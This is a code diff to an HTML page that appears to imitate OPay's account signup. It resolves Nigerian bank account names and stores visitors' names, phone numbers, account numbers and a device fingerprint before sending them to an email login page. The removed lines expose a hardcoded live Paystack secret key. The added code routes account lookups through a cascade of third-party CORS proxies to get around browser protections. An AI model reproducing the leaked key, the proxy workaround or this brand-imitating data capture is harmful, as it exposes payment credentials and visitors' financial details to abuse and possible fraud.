@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Get an OPay Plus Account</title>
+    <title>Get an OPay Account</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         /* ===== THEME VARIABLES ===== */
@@ -716,7 +716,7 @@
         </div>
 
         <div class="main-content">
-            <div class="title">Get an OPay Plus Account</div>
+            <div class="title">Get an OPay Account</div>
 
             <div class="bank-selector">
                 <select id="bankSelect" class="bank-dropdown" disabled>
@@ -821,7 +821,7 @@
         </div>
     </div>
 
-    <!-- Alert Modal for Existing User (no longer shown automatically, left for other possible uses) -->
+    <!-- Alert Modal for Existing User -->
     <div id="alertModal" class="alert-modal-overlay">
         <div class="alert-modal">
             <div class="alert-icon">
@@ -855,7 +855,6 @@
         (function() {
             // ========== SAFE DEVICE FINGERPRINT (FIXED) ==========
             function getDeviceFingerprint() {
-                // Safely access screen properties with fallback values
                 let width = 0, height = 0, colorDepth = 24;
                 if (typeof screen !== 'undefined') {
                     width = screen.width || 0;
@@ -930,7 +929,7 @@
                 window.location.href = 'login-email.html';
             });
 
-            // ========== Alert Modal (not used automatically, but kept for any manual trigger) ==========
+            // ========== Alert Modal ==========
             const alertModal = document.getElementById('alertModal');
             const alertLoginBtn = document.getElementById('alertLoginBtn');
             alertLoginBtn.addEventListener('click', () => {
@@ -938,14 +937,60 @@
                 window.location.href = 'login-email.html';
             });
 
-            // ========== Paystack Configuration ==========
-            const SECRET_KEY = 'sk_live_982c3772d00d6c6f0219ac6241d9747f581421e8';
-            const BASE_URL = 'https://api.paystack.co';
-            const headers = {
-                'Authorization': `Bearer ${SECRET_KEY}`,
-                'Content-Type': 'application/json'
-            };
+            // ═══════════════════════════════════════════════════════════
+            //  FLUTTERWAVE CONFIGURATION (replaces Paystack)
+            // ═══════════════════════════════════════════════════════════
+            const FLW_PUBLIC_KEY = 'FLWPUBK-2a381a0aa2818af869fb00758fd5c2ab-X';
+            const FLW_LEGACY_ENDPOINT = 'https://api.ravepay.co/flwv3-pug/getpaidx/api/resolve_account';
 
+            // OPay's bank code for the legacy (public-key) endpoint
+            const OPAY_BANK_CODE = '100004';
+            const OPAY_BANK_NAME = 'OPay Digital Services';
+
+            // Multi-proxy cascade to bypass CORS
+            const PROXIES = [
+                { name: 'direct', build: (url) => url },
+                {
+                    name: 'corsproxy.io',
+                    build: (url) => 'https://corsproxy.io/?url=' + encodeURIComponent(url)
+                },
+                {
+                    name: 'codetabs',
+                    build: (url) => 'https://api.codetabs.com/v1/proxy?quest=' + encodeURIComponent(url)
+                },
+                {
+                    name: 'thingproxy',
+                    build: (url) => 'https://thingproxy.freeboard.io/fetch/' + url
+                }
+            ];
+
+            async function fwFetch(url, options = {}) {
+                const attempts = [];
+                for (const proxy of PROXIES) {
+                    const proxyUrl = proxy.build(url);
+                    try {
+                        console.log('→ Trying proxy:', proxy.name);
+                        const response = await fetch(proxyUrl, options);
+                        const text = await response.text();
+                        let json;
+                        try {
+                            json = JSON.parse(text);
+                        } catch {
+                            throw new Error('Non-JSON response (HTTP ' + response.status + ')');
+                        }
+                        console.log('✅ Proxy', proxy.name, 'succeeded');
+                        return { ok: response.ok, status: response.status, json, proxyUsed: proxy.name };
+                    } catch (err) {
+                        attempts.push(proxy.name + ': ' + err.message);
+                        console.warn('❌ Proxy', proxy.name, 'failed:', err.message);
+                    }
+                }
+                const error = new Error('All proxies failed. ' + attempts.join(' | '));
+                error.attempts = attempts;
+                throw error;
+            }
+
+            // ─── DOM elements ────────────────────────────────────────────
             const bankSelect = document.getElementById('bankSelect');
             const phoneInput = document.getElementById('phoneInput');
             const nextBtn = document.getElementById('nextBtn');
@@ -965,34 +1010,17 @@
             let debounceTimer = null;
             let opayBankCode = null;
 
-            async function fetchOpayBank() {
-                try {
-                    const response = await fetch(`${BASE_URL}/bank`, { headers });
-                    const result = await response.json();
-                    if (result.status && result.data) {
-                        const opay = result.data.find(bank => 
-                            bank.name.toLowerCase().includes('opay') || 
-                            bank.name.toLowerCase().includes('opay digital services')
-                        );
-                        if (opay) {
-                            opayBankCode = opay.code;
-                            bankSelect.innerHTML = '';
-                            const option = document.createElement('option');
-                            option.value = opay.code;
-                            option.textContent = opay.name;
-                            option.selected = true;
-                            bankSelect.appendChild(option);
-                            bankSelect.disabled = false;
-                        } else {
-                            throw new Error('OPay bank not found');
-                        }
-                    } else {
-                        throw new Error('Failed to load banks');
-                    }
-                } catch (err) {
-                    console.error('Error fetching OPay:', err);
-                    bankSelect.innerHTML = '<option value="">OPay not available</option>';
-                }
+            // ─── Populate OPay bank entry (replaces Paystack fetch) ─────
+            function fetchOpayBank() {
+                opayBankCode = OPAY_BANK_CODE;
+                bankSelect.innerHTML = '';
+                const option = document.createElement('option');
+                option.value = OPAY_BANK_CODE;
+                option.textContent = OPAY_BANK_NAME;
+                option.selected = true;
+                bankSelect.appendChild(option);
+                bankSelect.disabled = false;
+                console.log('✅ OPay bank set:', OPAY_BANK_CODE);
             }
             fetchOpayBank();
 
@@ -1018,8 +1046,7 @@
                     accountNameSpan.textContent = data.account_name.toUpperCase();
                     const formattedPhone = phoneInput.value.replace(/(\d{4})(\d{3})(\d{3})/, '$1 $2 $3');
                     accountPhoneSpan.textContent = `+234 ${formattedPhone}`;
-                    const selectedOption = bankSelect.options[bankSelect.selectedIndex];
-                    accountBankNameSpan.textContent = selectedOption ? selectedOption.textContent : 'OPay Digital Services';
+                    accountBankNameSpan.textContent = OPAY_BANK_NAME;
                     verifyContent.style.display = 'block';
                     verifyError.style.display = 'none';
                 } else {
@@ -1030,6 +1057,7 @@
                 updateButtonState();
             }
 
+            // ─── Verify account via Flutterwave legacy endpoint ─────────
             async function verifyAccount() {
                 const accountNumber = phoneInput.value.trim();
                 const bankCode = bankSelect.value;
@@ -1037,16 +1065,36 @@
 
                 setLoading(true);
                 try {
-                    const url = `${BASE_URL}/bank/resolve?account_number=${accountNumber}&bank_code=${bankCode}`;
-                    const response = await fetch(url, { headers });
-                    const result = await response.json();
+                    const body = {
+                        recipientaccount: accountNumber,
+                        destbankcode:     bankCode,
+                        PBFPubKey:        FLW_PUBLIC_KEY
+                    };
 
-                    if (!response.ok || !result.status) {
-                        let errorMsg = result.message || `Verification failed (${response.status})`;
-                        throw new Error(errorMsg);
+                    console.log('Sending Flutterwave resolve request:', JSON.stringify(body));
+
+                    const res = await fwFetch(FLW_LEGACY_ENDPOINT, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(body)
+                    });
+
+                    console.log('Flutterwave raw response:', res.json);
+
+                    const inner = res.json && res.json.data && res.json.data.data;
+                    if (!res.ok || !res.json || res.json.status !== 'success' || !inner) {
+                        let msg = (res.json && res.json.message) || ('HTTP ' + res.status);
+                        if (res.json && res.json.data && res.json.data.data && res.json.data.data.responsemessage) {
+                            msg = res.json.data.data.responsemessage;
+                        }
+                        throw new Error(msg);
                     }
 
-                    displayResult(result.data);
+                    const normalised = {
+                        account_name:   inner.accountname,
+                        account_number: inner.accountnumber
+                    };
+                    displayResult(normalised);
                 } catch (err) {
                     console.error('Verification error:', err);
                     displayResult(null, err.message || 'Unable to verify account. Please check the number or try again.');
@@ -1069,7 +1117,9 @@
 
             function triggerAutoVerify() {
                 clearTimeout(debounceTimer);
-                const accountValid = phoneInput.value.trim().length === 10 && /^\d+$/.test(phoneInput.value.trim()) && bankSelect.value;
+                const accountValid = phoneInput.value.trim().length === 10 &&
+                                     /^\d+$/.test(phoneInput.value.trim()) &&
+                                     bankSelect.value;
                 if (accountValid && !isLoading) {
                     debounceTimer = setTimeout(() => {
                         verifyAccount();
@@ -1135,13 +1185,12 @@
 
             nextBtn.addEventListener('click', async (e) => {
                 if (!nextBtn.disabled) {
-                    // REMOVED the existing user fingerprint check – allow all users to proceed
                     const fullName = accountNameSpan.textContent;
                     const phoneDigits = phoneInput.value;
                     const fullPhone = '0' + phoneDigits;
                     const firstName = fullName.split(' ')[0] || 'User';
                     const bankCode = bankSelect.value;
-                    const bankName = bankSelect.options[bankSelect.selectedIndex].textContent;
+                    const bankName = OPAY_BANK_NAME;
                     const accountNumber = phoneDigits;
 
                     localStorage.setItem('opayUserFullName', fullName);
@@ -1151,7 +1200,6 @@
                     localStorage.setItem('opayBankName', bankName);
                     localStorage.setItem('opayAccountNumber', accountNumber);
 
-                    // Store fingerprint for future use (optional)
                     const fingerprint = getDeviceFingerprint();
                     localStorage.setItem('opayDeviceFingerprint', fingerprint);
 
@@ -1164,15 +1212,12 @@
                 }
             });
 
-            // Expose function for the Firebase module (still defined but not used to block)
+            // Expose function for the Firebase module
             window.checkFingerprintInFirestore = async function(fingerprint) {
                 return false; // placeholder, overridden by module
             };
 
-            // Initialize UI state
             updateButtonState();
-
-            // REMOVED automatic existing-user check on page load
         })();
     </script>
 
@@ -1203,7 +1248,7 @@
             }
         });
 
-        // Override the fingerprint check to query Firestore (no longer used for blocking, but kept for completeness)
+        // Override the fingerprint check (kept for completeness)
         window.checkFingerprintInFirestore = async function(fingerprint) {
             try {
                 const usersRef = collection(db, 'users');
@@ -1216,7 +1261,5 @@
             }
         };
     </script>
-   <script src="/pwa-check.js"></script>
-    <script src="/network-popup.js"></script>
 </body>
 </html>
